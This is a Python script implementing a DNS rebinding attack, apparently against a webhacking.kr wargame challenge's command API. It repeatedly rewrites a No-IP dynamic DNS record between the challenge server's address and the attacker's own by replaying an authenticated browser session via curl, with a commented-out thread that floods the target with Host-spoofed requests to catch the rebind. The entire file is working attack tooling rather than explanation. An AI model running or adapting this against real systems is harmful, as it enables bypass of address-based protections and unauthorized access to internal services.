import subprocess
import socket
import requests
import threading
import time

# === Configuration ===
CSRF_TOKEN = "******************"
SESSION = "******************"
HOSTNAME = "hostname"
DOMAIN = "ddns.net"
# FULL_HOST = f"webhacking.kr"  
FULL_HOST = f"{HOSTNAME}.{DOMAIN}"

WEBHACKING_IP = "202.182.106.159"
MY_IP = "Your.IP.Here"  # Replace with your actual IP address
TARGET_URL = "http://webhacking.kr:10020/api.php?q=command"

# === Change IP via No-IP ===
def change_ip(new_ip):
    url = f"https://my.noip.com/dns/records/legacy/{DOMAIN}/names/{HOSTNAME}/edit"
    data = f"_method=PUT&dns_type=A&host={HOSTNAME}&ipv4={new_ip}&wildcard=0"

    headers = [
        f"Host: my.noip.com",
        f"Content-Length: {len(data)}",
        "Hx-Trigger: record_edit_form",
        "Sec-Ch-Ua-Platform: \"Windows\"",
        f"X-Csrf-Token: {CSRF_TOKEN}",
        "Hx-Target: record_edit_form",
        "Hx-Current-Url: https://my.noip.com/dns/records",
        "Sec-Ch-Ua: \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"",
        "Sec-Ch-Ua-Mobile: ?0",
        "Hx-Request: true",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        "Accept: text/html;hx=1",
        "Content-Type: application/x-www-form-urlencoded",
        "Origin: https://my.noip.com",
        "Sec-Fetch-Site: same-origin",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: https://my.noip.com/dns/records",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: en-US,en;q=0.9,he;q=0.8",
        "Priority: u=1, i",
        "Connection: keep-alive"
    ]

    cmd = [
        "curl", "--path-as-is", "-i", "-s", "-k", "-X", "POST",
        "-b", f"laravel_session={SESSION}",
        "--data-binary", data,
        url
    ]
    for h in headers:
        cmd.extend(["-H", h])

    subprocess.run(cmd, capture_output=True, text=True)

# === DNS Flipping Thread ===
def dns_flipper():
    current_ip = WEBHACKING_IP
    while True:
        change_ip(current_ip)
        print(f"[*] DNS changed to: {current_ip}")
        current_ip = MY_IP if current_ip == WEBHACKING_IP else WEBHACKING_IP
        time.sleep(1)  # Timing can be adjusted

# # === Request Spammer Thread ===
# def request_spammer():
#     count = 0
#     while True:
#         try:
#             count += 1
#             resolved_ip = socket.gethostbyname(FULL_HOST)
#             # print(f"\n[+] Attempt #{count} - Resolved {FULL_HOST} to {resolved_ip}")
#             response = requests.get(
#                 TARGET_URL,
#                 timeout=2,
#                 headers={"Host": f"{FULL_HOST}:10020"}
#             )
#             print(f"[+] Response: {response.text.strip()}")
#         except requests.RequestException as e:
#             print(f"[!] Request error: {e}")
#         except Exception as e:
#             print(f"[!] Unexpected error: {e}")
#         time.sleep(0.2)

# === Main ===
if __name__ == "__main__":
    print("[*] Starting DNS flipper and request spammer threads...")
    threading.Thread(target=dns_flipper, daemon=True).start()
    # threading.Thread(target=request_spammer, daemon=True).start()

    while True:
        time.sleep(1)
